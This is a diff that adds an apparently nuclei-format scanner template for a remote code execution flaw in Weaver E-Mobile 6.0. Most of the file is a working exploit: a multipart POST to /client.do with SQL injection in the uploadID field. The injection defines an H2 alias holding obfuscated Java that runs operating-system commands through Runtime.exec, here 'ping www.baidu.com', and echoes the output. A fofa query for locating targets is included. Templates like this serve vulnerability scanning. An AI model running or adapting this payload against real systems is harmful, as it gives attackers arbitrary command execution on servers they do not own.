@@ -1,0 +1,48 @@
+id: E-Mobile 6.0-client-rce
+time: '2023-08-05'
+
+
+info:
+  name: 泛微E-Mobile 6.0
+  severity: high
+  description: E-Mobile 6.0-client-rce
+  reference: https://mp.weixin.qq.com/s/z-WN2_MTxdk3z4LvchXkXw
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="泛微E-Mobile"
+  
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/client.do"
+
+    Rheader:
+      - Accept:*/* & Accept-Encoding:gzip, deflate & Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7 & Upgrade-Insecure-Requests:1
+        
+    body: 
+      - |
+        ------WebKitFormBoundaryTm8YXcJeyKDClbU7
+        Content-Disposition: form-data; name="method"
+
+        getupload
+        ------WebKitFormBoundaryTm8YXcJeyKDClbU7
+        Content-Disposition: form-data; name="uploadID"
+
+        1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf('ping www.baidu.com');--
+        ------WebKitFormBoundaryTm8YXcJeyKDClbU7--
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "www.baidu.com"
+
+      - type: status
+        status:
+          - 200
+    
